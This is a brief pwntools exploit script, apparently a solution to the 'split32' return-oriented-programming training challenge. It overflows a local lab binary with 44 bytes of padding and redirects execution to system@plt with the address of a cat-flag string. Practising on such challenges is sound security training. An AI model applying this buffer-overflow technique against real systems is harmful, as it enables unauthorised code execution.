#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 44		  # EIP Offset at 44
    cat_flag = p32(0x0804a030)	  # Radare2 command: izz
    system_plt = p32(0x8048430)	  # objdump -d split32 | grep system
    p = process("./split32")
    payload = junk + system_plt + "BBBB" + cat_flag

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
